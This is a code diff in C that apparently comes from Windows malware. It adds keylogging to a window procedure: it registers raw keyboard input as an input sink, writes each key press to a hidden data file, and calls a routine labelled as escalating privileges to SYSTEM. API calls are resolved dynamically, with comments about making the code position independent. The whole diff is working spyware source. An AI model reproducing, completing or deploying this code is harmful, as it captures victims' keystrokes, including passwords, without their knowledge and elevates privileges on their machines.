@@ -3,15 +3,14 @@
 LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
 {
 	RAWINPUTDEVICE Rid;
-	UINT Size;
 	RAWINPUT *Ri;
-	static HANDLE hLog;
+	UINT dwSize;
+	static HANDLE hLog = INVALID_HANDLE_VALUE;
 	static API_TABLE Api;
 	static HDEVNOTIFY hDevice;
 	static LPVOID Strings = NULL;
 	static PPEB pPeb;
 	static HANDLE hSystem;
-	static BOOL bFlag;
 
 	switch (Message)
 	{
@@ -21,12 +20,24 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
 			break;
 		}
 		case WM_INPUT:
-		{
-			if (!bFlag)
-			{
+		{			
+			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, Ri, &dwSize, sizeof(RAWINPUTHEADER));
 
+			Ri = (PRAWINPUT)Api.RtlAllocateHeap(pPeb->ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)dwSize);
+			if (Ri == NULL)
+				return -1;
+
+			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, Ri, &dwSize, sizeof(RAWINPUTHEADER)))
+			{
+				if (Ri->header.dwType == RIM_TYPEKEYBOARD && Ri->data.keyboard.Message == WM_KEYDOWN)
+				{
+					if (!VxLogInput(&Api, hLog, Ri->data.keyboard.VKey))
+						Api.vxDestroyWindow(hWnd); //make position independent... whoops
+				}
 			}
-			
+
+			Api.RtlFreeHeap(pPeb->ProcessHeap, HEAP_ZERO_MEMORY, Ri);
+
 			break;
 		}
 		case WM_DESTROY:
@@ -47,9 +58,14 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
 			Rid.dwFlags = RIDEV_INPUTSINK;
 
 			//escalate to system....
-			
+			VxEscalateToSystemEx(&Api);
 
-			//create file
+			if (hLog == INVALID_HANDLE_VALUE)
+			{
+				hLog = VxCreateDataFile(&Api);
+				if (hLog == NULL)
+					return -1;
+			}
 
 			if (!Api.RegisterRawInputDevices(&Rid, 0x01, sizeof(RAWINPUTDEVICE)))
 				return -1;
@@ -58,7 +74,12 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
 		}
 
 		default:
-			return DefWindowProcW(hWnd, Message, wParam, lParam); //make position independent
+		{
+			if(Api.vxDefWindowProcW == NULL)
+				return DefWindowProcW(hWnd, Message, wParam, lParam); //find solution later...
+			else
+				return Api.vxDefWindowProcW(hWnd, Message, wParam, lParam);
+		}
 	}
 
 	return ERROR_SUCCESS;
